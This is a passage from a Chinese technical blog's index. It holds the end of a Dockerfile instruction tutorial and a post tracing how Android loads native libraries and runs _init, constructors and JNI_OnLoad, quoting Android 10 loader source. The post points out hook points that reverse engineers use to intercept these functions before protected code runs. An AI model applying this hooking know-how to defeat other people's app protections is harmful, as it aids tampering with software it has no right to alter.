NONE：如果基础镜像有健康检查指令，使用这行可以屏蔽掉其健康检查指令<br><br>HEALTHCHECK [选项] <span class="hljs-built_in">CMD</span> &lt;命令&gt; : 这边 <span class="hljs-built_in">CMD</span> 后面跟随的命令使用，可以参考 <span class="hljs-built_in">CMD</span> 的用法。<br></code></pre></td></tr></table></figure><h3 id="ONBUILD"><a href="#ONBUILD" class="headerlink" title="ONBUILD"></a>ONBUILD</h3><p>用于延迟构建命令的执行。简单的说，就是 Dockerfile 里用 ONBUILD 指定的命令，在本次构建镜像的过程中不会执行（假设镜像为 test-build）。当有新的 Dockerfile 使用了之前构建的镜像 FROM test-build ，这是执行新镜像的 Dockerfile 构建时候，会执行 test-build 的 Dockerfile 里的 ONBUILD 指定的命令。</p><p>格式：</p><figure class="highlight bnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bnf">ONBUILD <span class="hljs-attribute">&lt;其它指令&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>docker</category>
      
    </categories>
    
    
    <tags>
      
      <tag>docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SO函数运行顺序</title>
    <link href="/2021/08/22/so%E5%87%BD%E6%95%B0%E8%BF%90%E8%A1%8C%E9%A1%BA%E5%BA%8F/"/>
    <url>/2021/08/22/so%E5%87%BD%E6%95%B0%E8%BF%90%E8%A1%8C%E9%A1%BA%E5%BA%8F/</url>
    
    <content type="html"><![CDATA[<h2 id="加载运行流程"><a href="#加载运行流程" class="headerlink" title="加载运行流程"></a>加载运行流程</h2> <img src="/2021/08/22/so%E5%87%BD%E6%95%B0%E8%BF%90%E8%A1%8C%E9%A1%BA%E5%BA%8F/images/%E8%BF%90%E8%A1%8C%E6%B5%81%E7%A8%8B.png" class=""><h3 id="1-init"><a href="#1-init" class="headerlink" title="1. _init"></a>1. _init</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> <span class="hljs-keyword">void</span> _init(<span class="hljs-keyword">void</span>) &#123; &#125; <br></code></pre></td></tr></table></figure><p>编译生成后会在<code>.init</code>段</p> <img src="/2021/08/22/so%E5%87%BD%E6%95%B0%E8%BF%90%E8%A1%8C%E9%A1%BA%E5%BA%8F/images/readelf.png" class=""><p>IDA反编译对应<code>_init_proc</code>方法</p> <img src="/2021/08/22/so%E5%87%BD%E6%95%B0%E8%BF%90%E8%A1%8C%E9%A1%BA%E5%BA%8F/images/init_proc.png" class="" width="600" height="1100"><h3 id="2-constructor"><a href="#2-constructor" class="headerlink" title="2. constructor"></a>2. constructor</h3><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs delphi">__attribute__( (<span class="hljs-function"><span class="hljs-keyword">constructor</span><span class="hljs-params">(1)</span>) ) <span class="hljs-title">void</span> <span class="hljs-title">aaaa</span><span class="hljs-params">( void )</span></span><br><span class="hljs-function"><span class="hljs-comment">&#123;</span></span><br><span class="hljs-comment"><span class="hljs-function">LOGI( &quot;constructor constructor 1 called&quot; );</span></span><br><span class="hljs-comment"><span class="hljs-function"></span></span><br><span class="hljs-comment"><span class="hljs-function">&#125;</span></span><br><span class="hljs-function"></span><br><span class="hljs-function">__<span class="hljs-title">attribute__</span><span class="hljs-params">( (<span class="hljs-keyword">constructor</span>(2)</span>) ) <span class="hljs-title">void</span> <span class="hljs-title">aaaa</span><span class="hljs-params">( void )</span></span><br><span class="hljs-function"><span class="hljs-comment">&#123;</span></span><br><span class="hljs-comment"><span class="hljs-function">LOGI( &quot;constructor constructor 2 called&quot; );</span></span><br><span class="hljs-comment"><span class="hljs-function"></span></span><br><span class="hljs-comment"><span class="hljs-function">&#125;</span></span><br></code></pre></td></tr></table></figure><p>根据设置的优先级依次调用,编译生成后会在.init_array段</p> <img src="/2021/08/22/so%E5%87%BD%E6%95%B0%E8%BF%90%E8%A1%8C%E9%A1%BA%E5%BA%8F/images/init_array.png" class=""><p>IDA分析 ctrl+s定位到.init_array段</p> <img src="/2021/08/22/so%E5%87%BD%E6%95%B0%E8%BF%90%E8%A1%8C%E9%A1%BA%E5%BA%8F/images/ida_init_array.png" class=""><p>点击进入方法实现</p> <img src="/2021/08/22/so%E5%87%BD%E6%95%B0%E8%BF%90%E8%A1%8C%E9%A1%BA%E5%BA%8F/images/%E8%BF%9B%E5%85%A5%E6%96%B9%E6%B3%95%E5%AE%9E%E7%8E%B0.png" class="" width="600" height="400"><h3 id="3-JNI-OnLoad"><a href="#3-JNI-OnLoad" class="headerlink" title="3. JNI_OnLoad"></a>3. JNI_OnLoad</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">JNIEXPORT jint JNICALL <span class="hljs-title">JNI_OnLoad</span><span class="hljs-params">(JavaVM* vm, <span class="hljs-keyword">void</span>* reserved)</span></span>&#123;<br>    <span class="hljs-built_in">LOGI</span>(<span class="hljs-string">&quot;jni onload called&quot;</span>);<br>   <span class="hljs-comment">//TODO</span><br>    <span class="hljs-keyword">return</span> JNI_VERSION_1_4;  <span class="hljs-comment">//这里很重要，必须返回版本，否则加载会失败。</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="源码分析（Android10）"><a href="#源码分析（Android10）" class="headerlink" title="源码分析（Android10）"></a>源码分析（Android10）</h2><p>Android加载动态库有三种方式</p><ul><li><p>System.loadLibrary  </p><p>java中方法,不需要指定so路径，系统会自动补全</p></li><li><p>System.load</p><p>java中方法,需要指定so路径</p></li><li><p>dlopen</p><p>bionic库中方法，需要指定so路径</p></li></ul><h3 id="java-load-so"><a href="#java-load-so" class="headerlink" title="java load so"></a>java load so</h3><p> System.loadLibrary与System.load的实现在<code>/libcore/ojluni/src/main/java/java/lang/System.java</code>中</p><p>最终都会调用<code>/libcore/ojluni/src/main/java/java/lang/Runtime.java</code>下的native方法<code>nativeLoad</code></p><p>因为<code>System.load </code>的入参不是so文件的绝对路径，所以在系统需要从<code>java.library.path</code>属性中获取系统库的地址，遍历该so文件在哪个路径下，最终返回绝对路径，一般的<code>java.library.path</code>为</p><ul><li><p>/vendor/lib</p></li><li><p>/system/lib</p></li><li><p>/data/app-lib/com.xxxxx-1</p></li></ul><p>nativeLoad的JNI实现在<code>/libcore/ojluni/src/main/native/Runtime.c</code>中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">JNIEXPORT jstring JNICALL</span><br><span class="hljs-function"><span class="hljs-title">Runtime_nativeLoad</span><span class="hljs-params">(JNIEnv* env, jclass ignored, jstring javaFilename,</span></span><br><span class="hljs-params"><span class="hljs-function">                   jobject javaLoader, jclass caller)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> JVM_NativeLoad(env, javaFilename, javaLoader, caller);<br>&#125;<br></code></pre></td></tr></table></figure><p>调用<code>/art/openjdkjvm/OpenjdkJvm.cc</code>下得<code>JVM_NativeLoad</code>方法</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">JNIEXPORT jstring <span class="hljs-title">JVM_NativeLoad</span><span class="hljs-params">(JNIEnv* env,</span></span><br><span class="hljs-params"><span class="hljs-function">                                 jstring javaFilename,</span></span><br><span class="hljs-params"><span class="hljs-function">                                 jobject javaLoader,</span></span><br><span class="hljs-params"><span class="hljs-function">                                 jclass caller)</span> </span>&#123;<br>  <br>    art::JavaVMExt* vm = art::Runtime::<span class="hljs-built_in">Current</span>()-&gt;<span class="hljs-built_in">GetJavaVM</span>();<br>    <span class="hljs-keyword">bool</span> success = vm-&gt;<span class="hljs-built_in">LoadNativeLibrary</span>(env,<br>                                         filename.<span class="hljs-built_in">c_str</span>(),<br>                                         javaLoader,<br>                                         caller,<br>                                         &amp;error_msg);<br>  <span class="hljs-comment">// Don&#x27;t let a pending exception from JNI_OnLoad cause a CheckJNI issue with NewStringUTF.</span><br>  env-&gt;<span class="hljs-built_in">ExceptionClear</span>();<br>  <span class="hljs-keyword">return</span> env-&gt;<span class="hljs-built_in">NewStringUTF</span>(error_msg.<span class="hljs-built_in">c_str</span>());<br>&#125;<br></code></pre></td></tr></table></figure><p>调用当前文件中的<code>LoadNativeLibrary</code>方法</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">JavaVMExt::LoadNativeLibrary</span><span class="hljs-params">(JNIEnv* env,</span></span><br><span class="hljs-params"><span class="hljs-function">                                  <span class="hljs-keyword">const</span> std::string&amp; path,</span></span><br><span class="hljs-params"><span class="hljs-function">                                  jobject class_loader,</span></span><br><span class="hljs-params"><span class="hljs-function">                                  jclass caller_class,</span></span><br><span class="hljs-params"><span class="hljs-function">                                  std::string* error_msg)</span> </span>&#123;<br>     ......<br><br>  <span class="hljs-keyword">void</span>* handle = android::<span class="hljs-built_in">OpenNativeLibrary</span>(<br>      env,<br>      runtime_-&gt;<span class="hljs-built_in">GetTargetSdkVersion</span>(),<br>      path_str,<br>      class_loader,<br>      (caller_location.<span class="hljs-built_in">empty</span>() ? <span class="hljs-literal">nullptr</span> : caller_location.<span class="hljs-built_in">c_str</span>()),<br>      library_path.<span class="hljs-built_in">get</span>(),<br>      &amp;needs_native_bridge,<br>      &amp;nativeloader_error_msg);<br><br>  <br>  <span class="hljs-keyword">bool</span> was_successful = <span class="hljs-literal">false</span>;<br>  <span class="hljs-keyword">void</span>* sym = library-&gt;<span class="hljs-built_in">FindSymbol</span>(<span class="hljs-string">&quot;JNI_OnLoad&quot;</span>, <span class="hljs-literal">nullptr</span>);<br>  <span class="hljs-keyword">if</span> (sym == <span class="hljs-literal">nullptr</span>) &#123;<br>    was_successful = <span class="hljs-literal">true</span>;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-built_in">VLOG</span>(jni) &lt;&lt; <span class="hljs-string">&quot;[Calling JNI_OnLoad in \&quot;&quot;</span> &lt;&lt; path &lt;&lt; <span class="hljs-string">&quot;\&quot;]&quot;</span>;<br>    <span class="hljs-keyword">using</span> JNI_OnLoadFn = <span class="hljs-built_in"><span class="hljs-keyword">int</span></span>(*)(JavaVM*, <span class="hljs-keyword">void</span>*);<br>    JNI_OnLoadFn jni_on_load = <span class="hljs-keyword">reinterpret_cast</span>&lt;JNI_OnLoadFn&gt;(sym);<br>    <span class="hljs-keyword">int</span> version = (*jni_on_load)(<span class="hljs-keyword">this</span>, <span class="hljs-literal">nullptr</span>);<br><br>.........<br><br>    <span class="hljs-keyword">if</span> (version == JNI_ERR) &#123;<br>      <span class="hljs-built_in">StringAppendF</span>(error_msg, <span class="hljs-string">&quot;JNI_ERR returned from JNI_OnLoad in \&quot;%s\&quot;&quot;</span>, path.<span class="hljs-built_in">c_str</span>());<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (JavaVMExt::<span class="hljs-built_in">IsBadJniVersion</span>(version)) &#123;<br>      <span class="hljs-built_in">StringAppendF</span>(error_msg, <span class="hljs-string">&quot;Bad JNI version returned from JNI_OnLoad in \&quot;%s\&quot;: %d&quot;</span>,<br>                    path.<span class="hljs-built_in">c_str</span>(), version);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      was_successful = <span class="hljs-literal">true</span>;<br>    &#125;<br>  &#125;<br><br>  library-&gt;<span class="hljs-built_in">SetResult</span>(was_successful);<br>  <span class="hljs-keyword">return</span> was_successful;<br>&#125;<br></code></pre></td></tr></table></figure><p>最终调用了<code>android::OpenNativeLibrary</code>方法加载SO文件，加载成功后会查找符号表是否有<code>JNI_OnLoad</code>,如果有则根据<code>JNI_OnLoad</code>的地址进行调用，然后判断返回值<code>version</code>是否正确,这也是为什么<code>JNI_OnLoad</code>要返回版本的原因。</p><p>所以可以通过<code>OpenNativeLibrary</code>方法对<code>JNI_OnLoad</code>进行HOOK（此时SO已加载但还未执行JNI_OnLoad方法）</p><p>上面的运行流程中<code>JNI_OnLoad</code>排在第三位，也就是说<code>_init</code>和<code>constructor</code>在<code>OpenNativeLibrary</code>方法中就以执行</p><p>继续分析<code>OpenNativeLibrary</code>方法，在<code>/system/core/libnativeloader/native_loader.cpp</code>中</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span>* <span class="hljs-title">OpenNativeLibrary</span><span class="hljs-params">(JNIEnv* env, <span class="hljs-keyword">int32_t</span> target_sdk_version, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* path,</span></span><br><span class="hljs-params"><span class="hljs-function">                        jobject class_loader, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* caller_location, jstring library_path,</span></span><br><span class="hljs-params"><span class="hljs-function">                        <span class="hljs-keyword">bool</span>* needs_native_bridge, <span class="hljs-keyword">char</span>** error_msg)</span> </span>&#123;<br> <br>  <br>  <span class="hljs-keyword">if</span> (class_loader == <span class="hljs-literal">nullptr</span>) &#123;<br>    *needs_native_bridge = <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">if</span> (caller_location != <span class="hljs-literal">nullptr</span>) &#123;<br>      <span class="hljs-keyword">android_namespace_t</span>* boot_namespace = <span class="hljs-built_in">FindExportedNamespace</span>(caller_location);<br>      <span class="hljs-keyword">if</span> (boot_namespace != <span class="hljs-literal">nullptr</span>) &#123;<br>        <span class="hljs-keyword">const</span> android_dlextinfo dlextinfo = &#123;<br>            .flags = ANDROID_DLEXT_USE_NAMESPACE,<br>            .library_namespace = boot_namespace,<br>        &#125;;<br>        <span class="hljs-keyword">void</span>* handle = <span class="hljs-built_in">android_dlopen_ext</span>(path, RTLD_NOW, &amp;dlextinfo);<br>        <span class="hljs-keyword">if</span> (handle == <span class="hljs-literal">nullptr</span>) &#123;<br>          *error_msg = <span class="hljs-built_in">strdup</span>(<span class="hljs-built_in">dlerror</span>());<br>        &#125;<br>        <span class="hljs-keyword">return</span> handle;<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">void</span>* handle = <span class="hljs-built_in">dlopen</span>(path, RTLD_NOW);<br>    <span class="hljs-keyword">if</span> (handle == <span class="hljs-literal">nullptr</span>) &#123;<br>      *error_msg = <span class="hljs-built_in">strdup</span>(<span class="hljs-built_in">dlerror</span>());<br>    &#125;<br>    <span class="hljs-keyword">return</span> handle;<br>  &#125;<br> <br> ........<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">OpenNativeLibraryInNamespace</span>(ns, path, needs_native_bridge, error_msg);<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span>* <span class="hljs-title">OpenNativeLibraryInNamespace</span><span class="hljs-params">(NativeLoaderNamespace* ns, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* path,</span></span><br><span class="hljs-params"><span class="hljs-function">                                   <span class="hljs-keyword">bool</span>* needs_native_bridge, <span class="hljs-keyword">char</span>** error_msg)</span> </span>&#123;<br>  <span class="hljs-keyword">if</span> (ns-&gt;<span class="hljs-built_in">is_android_namespace</span>()) &#123;<br>    android_dlextinfo extinfo;<br>    extinfo.flags = ANDROID_DLEXT_USE_NAMESPACE;<br>    extinfo.library_namespace = ns-&gt;<span class="hljs-built_in">get_android_ns</span>();<br><br>    <span class="hljs-keyword">void</span>* handle = <span class="hljs-built_in">android_dlopen_ext</span>(path, RTLD_NOW, &amp;extinfo);<br>    <span class="hljs-keyword">if</span> (handle == <span class="hljs-literal">nullptr</span>) &#123;<br>      *error_msg = <span class="hljs-built_in">strdup</span>(<span class="hljs-built_in">dlerror</span>());<br>    &#125;<br>    *needs_native_bridge = <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">return</span> handle;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">void</span>* handle = <span class="hljs-built_in">NativeBridgeLoadLibraryExt</span>(path, RTLD_NOW, ns-&gt;<span class="hljs-built_in">get_native_bridge_ns</span>());<br>    <span class="hljs-keyword">if</span> (handle == <span class="hljs-literal">nullptr</span>) &#123;<br>      *error_msg = <span class="hljs-built_in">strdup</span>(<span class="hljs-built_in">NativeBridgeGetError</span>());<br>    &#125;<br>    *needs_native_bridge = <span class="hljs-literal">true</span>;<br>    <span class="hljs-keyword">return</span> handle;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>调用<code>/bionic/libdl/libdl.cpp</code>中的<code>android_dlopen_ext</code>方法加载SO,该方法最终会调用linker中的<code>do_dlopen</code>,linker的实现在<code>/bionic/linker/linker.cpp</code>中</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><br><span class="hljs-function"><span class="hljs-keyword">void</span>* <span class="hljs-title">do_dlopen</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* name, <span class="hljs-keyword">int</span> flags,</span></span><br><span class="hljs-params"><span class="hljs-function">                <span class="hljs-keyword">const</span> android_dlextinfo* extinfo,</span></span><br><span class="hljs-params"><span class="hljs-function">                <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span>* caller_addr)</span> </span>&#123;<br><br>  .......<br>    <br>  soinfo* si = <span class="hljs-built_in">find_library</span>(ns, translated_name, flags, extinfo, caller);<br>  <span class="hljs-keyword">if</span> (si != <span class="hljs-literal">nullptr</span>) &#123;<br>    <span class="hljs-keyword">void</span>* handle = si-&gt;<span class="hljs-built_in">to_handle</span>();<br>    si-&gt;<span class="hljs-built_in">call_constructors</span>();<br>    <span class="hljs-keyword">return</span> handle;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>find_library方法才是真正的加载SO，执行定位动态节、解析动态节、加载动态节 、重定位等，像SO抹头、自定义Linker等加固方式都是在这里做的文章。在低版本中加载SO文件后返回的是soinfo结构体，高版本返回的是to_handle后的指针。</p><p><code>do_dlopen</code>方法调用了<code>call_constructors</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">soinfo::call_constructors</span><span class="hljs-params">()</span> </span>&#123;<br> <br>......<br>    <br>  <span class="hljs-built_in">call_function</span>(<span class="hljs-string">&quot;DT_INIT&quot;</span>, init_func_, <span class="hljs-built_in">get_realpath</span>());<br>  <span class="hljs-built_in">call_array</span>(<span class="hljs-string">&quot;DT_INIT_ARRAY&quot;</span>, init_array_, init_array_count_, <span class="hljs-literal">false</span>, <span class="hljs-built_in">get_realpath</span>());<br><br>.......<br>&#125;<br></code></pre></td></tr></table></figure><p>调用call_function和call_array并根据<code>init_func_</code>,<code>init_array_</code>符号地址执行对应的方法</p><p>获取符号表的实现<code>/bionic/linker/linker.cpp</code>中的<code>soinfo::prelink_image</code>方法，在<code>find_library</code>方法执行完成后就已获取到符号信息。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">soinfo::prelink_image</span><span class="hljs-params">()</span> </span>&#123;<br><br>........<br><br><span class="hljs-keyword">case</span> DT_INIT:<br>  init_func_ = <span class="hljs-keyword">reinterpret_cast</span>&lt;<span class="hljs-keyword">linker_ctor_function_t</span>&gt;(load_bias + d-&gt;d_un.d_ptr);<br>  <span class="hljs-keyword">break</span>;<br><br><span class="hljs-keyword">case</span> DT_FINI:<br>  fini_func_ = <span class="hljs-keyword">reinterpret_cast</span>&lt;<span class="hljs-keyword">linker_dtor_function_t</span>&gt;(load_bias + d-&gt;d_un.d_ptr);<br>  <span class="hljs-keyword">break</span>;<br><br><span class="hljs-keyword">case</span> DT_INIT_ARRAY:<br>  init_array_ = <span class="hljs-keyword">reinterpret_cast</span>&lt;<span class="hljs-keyword">linker_ctor_function_t</span>*&gt;(load_bias + d-&gt;d_un.d_ptr);<br>  <span class="hljs-keyword">break</span>;<br><br><span class="hljs-keyword">case</span> DT_INIT_ARRAYSZ:<br>  init_array_count_ = <span class="hljs-keyword">static_cast</span>&lt;<span class="hljs-keyword">uint32_t</span>&gt;(d-&gt;d_un.d_val) / <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(<span class="hljs-built_in">ElfW</span>(Addr));<br>  <span class="hljs-keyword">break</span>;<br>........<br>&#125;<br></code></pre></td></tr></table></figure><p>call_function实现</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-function"><span class="hljs-title">call_function</span>(<span class="hljs-params"><span class="hljs-keyword">const</span> char* function_name __unused,</span></span><br><span class="hljs-params"><span class="hljs-function">                          linker_ctor_function_t <span class="hljs-keyword">function</span>,</span></span><br><span class="hljs-params"><span class="hljs-function">                          <span class="hljs-keyword">const</span> char* realpath __unused</span>)</span> &#123;<br> ......<br>    <br>  <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">g_argc, g_argv, g_envp</span>)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>call_array实现</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> F&gt;<br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">call_array</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* array_name __unused,F* functions, <span class="hljs-keyword">size_t</span> count,</span></span><br><span class="hljs-params"><span class="hljs-function">                       <span class="hljs-keyword">bool</span> reverse,</span></span><br><span class="hljs-params"><span class="hljs-function">                       <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* realpath)</span> </span>&#123; <br>  <br>  <span class="hljs-keyword">int</span> begin = reverse ? (count - <span class="hljs-number">1</span>) : <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">int</span> end = reverse ? <span class="hljs-number">-1</span> : count;<br>  <span class="hljs-keyword">int</span> step = reverse ? <span class="hljs-number">-1</span> : <span class="hljs-number">1</span>;<br><br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = begin; i != end; i += step) &#123;<br>    <span class="hljs-built_in">call_function</span>(<span class="hljs-string">&quot;function&quot;</span>, functions[i], realpath);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>call_array最终遍历所有<code>DT_INIT_ARRAY</code>的地址后调用<code>call_function</code>方法执行。</p><p>所以对于<code>_init</code>和<code>construcor</code>方法的HOOK时机，可以选择<code>call_function</code>方法(SO已完成加载,_init、construcor还未执行)</p><h3 id="Native-load-so"><a href="#Native-load-so" class="headerlink" title="Native load so"></a>Native load so</h3><p>native <code>dlopen</code>的实现在<code> /bionic/libdl/libdl.cpp</code>中</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp">__attribute__((__weak__))<br><span class="hljs-function"><span class="hljs-keyword">void</span>* <span class="hljs-title">dlopen</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* filename, <span class="hljs-keyword">int</span> flag)</span> </span>&#123;<br>  <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span>* caller_addr = __builtin_return_address(<span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">return</span> __loader_dlopen(filename, flag, caller_addr);<br>&#125;<br></code></pre></td></tr></table></figure><p>最终会调用<code>/bionic/linker/linker.cpp</code>中的<code>do_dlopen</code>方法。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>java层loadso执行方法顺序 <code>_init--&gt;constructor--&gt;JNI_OnLoad</code></li><li>NDK开发dlopen方法loadso执行方法顺序 <code>_init--&gt;constructor</code></li><li>无论Java层还是NDK开发中的dlopen最终都会调用linker的<code>do_dlopen</code>方法</li><li>可以选择<code>OpenNativeLibrary</code>、<code>call_function</code>完成对<code>JNI_OnLoad</code>、<code>_init</code>、<code>constructor</code>方法的HOOK</li></ul>]]></content>
    
    
    <categories>
      
      <category>android</category>
      
    </categories>
    
    
    <tags>
      
      <tag>android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JDB调试APP</title>
    <link href="/2021/08/22/JDB%E8%B0%83%E8%AF%95APP/"/>
    <url>/2021/08/22/JDB%E8%B0%83%E8%AF%95APP/</url>
    
